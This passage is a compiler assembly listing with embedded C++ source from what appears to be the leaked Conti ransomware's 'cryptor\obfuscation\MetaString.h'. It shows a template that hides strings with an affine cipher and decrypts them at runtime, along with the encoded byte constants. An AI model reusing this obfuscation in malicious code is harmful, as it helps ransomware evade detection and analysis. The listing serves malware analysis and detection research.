  00007	84 c0		 test	 al, al
  00009	75 6c		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0e 00 00
	00		 mov	 r11d, 14
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 16	 sub	 ecx, 22

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 8d 04 49	 lea	 r8d, DWORD PTR [rcx+rcx*2]
  00034	41 c1 e0 02	 shl	 r8d, 2

; 40   :     return (a % n + n) % n;

  00038	41 f7 e8	 imul	 r8d
  0003b	41 03 d0	 add	 edx, r8d
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	44 2b c0	 sub	 r8d, eax
  0004e	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00053	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00057	41 f7 e8	 imul	 r8d
  0005a	41 03 d0	 add	 edx, r8d
  0005d	c1 fa 06	 sar	 edx, 6
  00060	8b c2		 mov	 eax, edx
  00062	c1 e8 1f	 shr	 eax, 31
  00065	03 d0		 add	 edx, eax
  00067	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0006a	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0006d	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  00071	49 83 eb 01	 sub	 r11, 1
  00075	75 a9		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00077	49 8b c1	 mov	 rax, r9
  0007a	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2f	 mov	 BYTE PTR [rcx+1], 47	; 0000002fH
  00007	c6 41 02 16	 mov	 BYTE PTR [rcx+2], 22
  0000b	c6 41 03 5e	 mov	 BYTE PTR [rcx+3], 94	; 0000005eH
  0000f	c6 41 04 16	 mov	 BYTE PTR [rcx+4], 22
  00013	c6 41 05 54	 mov	 BYTE PTR [rcx+5], 84	; 00000054H
  00017	c6 41 06 16	 mov	 BYTE PTR [rcx+6], 22
  0001b	c6 41 07 74	 mov	 BYTE PTR [rcx+7], 116	; 00000074H
  0001f	c6 41 08 16	 mov	 BYTE PTR [rcx+8], 22
  00023	c6 41 09 4f	 mov	 BYTE PTR [rcx+9], 79	; 0000004fH
  00027	c6 41 0a 16	 mov	 BYTE PTR [rcx+10], 22
  0002b	c6 41 0b 05	 mov	 BYTE PTR [rcx+11], 5
  0002f	c6 41 0c 16	 mov	 BYTE PTR [rcx+12], 22
  00033	c6 41 0d 16	 mov	 BYTE PTR [rcx+13], 22
  00037	c6 41 0e 16	 mov	 BYTE PTR [rcx+14], 22
  0003b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0003f	48 8b c1	 mov	 rax, rcx
  00042	c3		 ret	 0
??0?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0a 00 00
	00		 mov	 r11d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 6f	 sub	 ecx, 111		; 0000006fH

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 1c	 imul	 r8d, ecx, 28

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1f	 mov	 BYTE PTR [rcx+1], 31
  00007	c6 41 02 6f	 mov	 BYTE PTR [rcx+2], 111	; 0000006fH
  0000b	c6 41 03 21	 mov	 BYTE PTR [rcx+3], 33	; 00000021H
  0000f	c6 41 04 6f	 mov	 BYTE PTR [rcx+4], 111	; 0000006fH
  00013	c6 41 05 41	 mov	 BYTE PTR [rcx+5], 65	; 00000041H
  00017	c6 41 06 6f	 mov	 BYTE PTR [rcx+6], 111	; 0000006fH
  0001b	c6 41 07 73	 mov	 BYTE PTR [rcx+7], 115	; 00000073H
  0001f	c6 41 08 6f	 mov	 BYTE PTR [rcx+8], 111	; 0000006fH
  00023	c6 41 09 6f	 mov	 BYTE PTR [rcx+9], 111	; 0000006fH
  00027	c6 41 0a 6f	 mov	 BYTE PTR [rcx+10], 111	; 0000006fH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0DL@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<59,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 66 00 00 00	 mov	 eax, 102		; 00000066H
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 23	 imul	 ecx, eax, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 27	 mov	 BYTE PTR [rcx+1], 39	; 00000027H
  00007	c6 41 02 66	 mov	 BYTE PTR [rcx+2], 102	; 00000066H
  0000b	c6 41 03 0c	 mov	 BYTE PTR [rcx+3], 12
  0000f	c6 41 04 66	 mov	 BYTE PTR [rcx+4], 102	; 00000066H
  00013	c6 41 05 63	 mov	 BYTE PTR [rcx+5], 99	; 00000063H
  00017	c6 41 06 66	 mov	 BYTE PTR [rcx+6], 102	; 00000066H
  0001b	c6 41 07 34	 mov	 BYTE PTR [rcx+7], 52	; 00000034H
  0001f	c6 41 08 66	 mov	 BYTE PTR [rcx+8], 102	; 00000066H
  00023	c6 41 09 66	 mov	 BYTE PTR [rcx+9], 102	; 00000066H
  00027	c6 41 0a 66	 mov	 BYTE PTR [rcx+10], 102	; 00000066H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0BN@$0GG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<29,102,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 4f 00 00 00	 mov	 eax, 79			; 0000004fH
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 3f	 imul	 ecx, eax, 63		; 0000003fH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 2c	 mov	 BYTE PTR [rcx+1], 44	; 0000002cH
  00007	c6 41 02 4f	 mov	 BYTE PTR [rcx+2], 79	; 0000004fH
  0000b	c6 41 03 1d	 mov	 BYTE PTR [rcx+3], 29
  0000f	c6 41 04 4f	 mov	 BYTE PTR [rcx+4], 79	; 0000004fH
  00013	c6 41 05 19	 mov	 BYTE PTR [rcx+5], 25
  00017	c6 41 06 4f	 mov	 BYTE PTR [rcx+6], 79	; 0000004fH
  0001b	c6 41 07 15	 mov	 BYTE PTR [rcx+7], 21
  0001f	c6 41 08 4f	 mov	 BYTE PTR [rcx+8], 79	; 0000004fH
  00023	c6 41 09 4f	 mov	 BYTE PTR [rcx+9], 79	; 0000004fH
  00027	c6 41 0a 4f	 mov	 BYTE PTR [rcx+10], 79	; 0000004fH
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$01$0EP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<2,79,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 63   :         if (!isDecrypted())

  00003	84 c0		 test	 al, al
  00005	75 5a		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00007	4c 8d 51 01	 lea	 r10, QWORD PTR [rcx+1]
  0000b	41 bb 0a 00 00
	00		 mov	 r11d, 10
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00011	41 0f b6 02	 movzx	 eax, BYTE PTR [r10]
  00015	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00019	44 6b c0 c2	 imul	 r8d, eax, -62		; ffffffffffffffc2H

; 40   :     return (a % n + n) % n;

  0001d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00022	41 f7 e8	 imul	 r8d
  00025	41 03 d0	 add	 edx, r8d
  00028	c1 fa 06	 sar	 edx, 6
  0002b	8b c2		 mov	 eax, edx
  0002d	c1 e8 1f	 shr	 eax, 31
  00030	03 d0		 add	 edx, eax
  00032	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00035	44 2b c0	 sub	 r8d, eax
  00038	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0003d	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00041	41 f7 e8	 imul	 r8d
  00044	41 03 d0	 add	 edx, r8d
  00047	c1 fa 06	 sar	 edx, 6
  0004a	8b c2		 mov	 eax, edx
  0004c	c1 e8 1f	 shr	 eax, 31
  0004f	03 d0		 add	 edx, eax
  00051	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00054	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00057	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0005b	49 83 eb 01	 sub	 r11, 1
  0005f	75 b0		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00061	48 8d 41 01	 lea	 rax, QWORD PTR [rcx+1]
  00065	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0CL@$0A@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<43,0,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
